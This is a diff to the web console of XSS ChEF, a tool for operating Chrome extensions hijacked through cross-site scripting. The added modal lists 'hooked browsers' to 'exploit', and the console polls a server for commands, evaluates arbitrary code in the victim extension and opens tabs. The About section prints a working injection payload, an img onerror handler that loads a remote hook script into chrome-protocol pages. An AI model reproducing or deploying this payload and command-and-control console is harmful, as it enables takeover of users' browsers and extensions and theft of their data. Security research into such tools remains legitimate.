@@ -4,7 +4,6 @@
 <script src="bootstrap/js/bootstrap.min.js"></script>
 <title>XSS ChEF console</title>
 <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css"/>
-<link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
 <style>
 body {padding-top: 50px;}
 span,td,th {font-size: 11px; line-height: 14px;}
@@ -42,28 +41,13 @@ display:none;
 </div>
 <div class="container">
     <div class="row">
-        <!--
-        <div class="span2">
-            <div class="well" style="padding: 8px 0;">
-                <ul class="nav nav-list">
-                    <li class="nav-header">
-                    Hooks </li>
-                    <li class="active">
-                    <a href="#">#1</a>
-                    </li>
-                    <li>
-                    <a href="#">#2</a>
-                    </li>
-                </ul>
-            </div>
-        </div>
-        -->
             <div class="tabbable">
                 <ul class="nav nav-tabs">
+                    <li><button title="Choose hooked browser" id=choose-hook class='btn btn-secondary'><i class="icon-list"></i></button>&nbsp;&nbsp;</li>
                     <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
                     <li><a href="#tab-ext-info" data-toggle="tab">Hooked extension info</a></li>
-                    <li><a href="#tab-ext-commands" data-toggle="tab">Commands</a></li>
-                    <li><button id=refresh-hook class='btn btn-secondary'><i class="icon-refresh"></i> Refresh hook</button> </li>                    
+                    <li><a href="#tab-ext-commands" data-toggle="tab">Extension commands</a></li>
+                    <li> <button id=refresh-hook title="Refresh this hook" class='btn btn-secondary'><i class="icon-refresh"></i></button> </li>
                 </ul>
                 <div class="tab-content">
                     <div class="tab-pane active" id="tab-tabs">
@@ -142,6 +126,9 @@ display:none;
                         <table class="table-striped table table-condensed">
                         <tbody>
                         <tr>
+                        <th>Hook ID</th><td id=hook-id></td>
+                        </tr>
+                        <tr>
                         <th>URL</th><td data-fld=extension></td>
                         </tr>
                         <tr>
@@ -172,7 +159,7 @@ display:none;
                         <div class=control-group>
 
             <label>Create new tab</label>
-            <input id="tab-create-url" style="padding:0"/>
+            <input id="tab-create-url" style="padding:0" placeholder="http://example.com/" />
                             <form action="#">
                                 <label>Eval</label>
                                 <textarea name=eval-ext class="mono span8" placeholder="alert(/place code to eval in extension/)"></textarea>
@@ -204,6 +191,23 @@ display:none;
   </div>
 </div>
 
+<div class="modal" id="choose-hook-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Choose browser hook</h3>
+  </div>
+  <div class="modal-body">
+  <p>Each hook below represents one browser that XSS has been activated in. Chose one you'd like to
+  exploit:</p>
+  <select name="choose-hook">
+  </select>
+  </div>
+  <div class=modal-footer>
+  <a href="#" id=hook-chosen class="btn btn-primary">Choose hook</a>
+  <a href="#" class="btn" data-dismiss=modal>Cancel</a>
+</div>
+</div>
+
 <div class="modal" id="about-modal">
   <div class="modal-header">
     <a class="close" data-dismiss="modal">&times;</a>
@@ -227,7 +231,7 @@ display:none;
       </ul>
       <h4>How to use?</h4>
       <p>Inject Chrome extension with a hook like this: 
-      <pre>&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='http://dev.localhost/xss-chef/xsschef.js';d.body.appendChild(e);}"&gt;</pre>
+      <pre>&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='http://dev.localhost/xss-chef/hook.php';d.body.appendChild(e);}"&gt;</pre>
       <p>Launch this console and start having fun!
   </div>
 </div>
@@ -239,7 +243,7 @@ display:none;
 <script>
 
 // current hook name
-var hook = 'xxx';
+var hook = '';
 var currentTab = null;
 
 var sendCmd = function(cmd, param, additional) {
@@ -452,21 +456,56 @@ $(function() {
         sendCmd('report');
     });
 
-    $("#tab-create-url").click(function() {
-        sendCmd('createtab', this.value);
+    $("#tab-create-url").keydown(function(e) {
+        if (event.keyCode == '13' && this.value) {
+            sendCmd('createtab', this.value);
+        }
     });
     
+    $('#hook-chosen').click(function() {
+        var v;
+        if (v = $('select[name="choose-hook"]').val()) {
+            hook = v;
+            $('#hook-id').text(v);
+            al('Chosen hook: ' + v);
+            $('#choose-hook-modal').modal('hide');
+            sendCmd('report');
+
+        }
+        return false;
+    });
+    
+    $('#choose-hook').click(function() {
+        $.getJSON('server.php', function(json) {
+            if (!json.length) {
+                al("No hooks present...");
+                return;
+            }
+            var $s = $('select[name="choose-hook"]').html('');
+            $s.append($('<option>').text('choose...'));
+            
+            for (var i =0; i < json.length; i++) {
+                $('<option>').text(json[i]).val(json[i]).appendTo($s);
+            }
+            $s.val(hook); // select current hook
+            $('#choose-hook-modal').modal('show');
+
+        });
+        return false;
+    })
     
     $("#fix-server").click(function() {
-        $.get('server.php?delete=1&ch=' + encodeURIComponent(hook));
-        $.get('server.php?delete=1&ch=' + encodeURIComponent(hook) + '-cmd');
+        $.get('server.php?delete=1');
     });
+    
     setInterval(function() {
-        $.getJSON('server.php?ch=' + encodeURIComponent(hook), function(json) {
-            for (var i=0; i < json.length; i++) {
-                processResponse(json[i][0],hook);
-            }
-        });
+        if (hook) {
+            $.getJSON('server.php?ch=' + encodeURIComponent(hook), function(json) {
+                for (var i=0; i < json.length; i++) {
+                    processResponse(json[i][0],hook);
+                }
+            });
+        }
     }, 2000);
     
     // start with saved data
